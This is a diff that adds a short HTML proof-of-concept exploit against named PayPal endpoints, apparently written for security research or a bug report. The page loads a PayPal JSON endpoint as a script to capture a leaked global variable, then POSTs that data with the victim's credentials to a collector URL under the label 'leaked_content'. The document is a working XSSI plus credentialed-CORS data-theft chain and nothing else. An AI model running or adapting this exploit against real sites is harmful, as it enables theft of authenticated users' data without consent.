@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>PayPal MIME + CORS Exploit</title>
+</head>
+<body>
+  <h1>XSSI + Credentialed CORS Exploit PoC</h1>
+
+  <!-- Step 1: Load executable JSON (XSSI) -->
+  <script src="https://registration.paypal.com/byob/pageContent/pageContent.json?country=US"></script>
+
+  <!-- Step 2: After a delay, exfiltrate using credentialed CORS -->
+  <script>
+    setTimeout(() => {
+      if (typeof content !== 'undefined') {
+        fetch("https://postcollector.paypal.com/collector/collectorPost", {
+          method: "POST",
+          credentials: "include",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            attack_type: "XSSI + CORS Chain",
+            leaked_content: content
+          })
+        });
+      } else {
+        console.log("No global var found — content missing");
+      }
+    }, 2000); // wait to make sure script loads
+  </script>
+</body>
+</html>
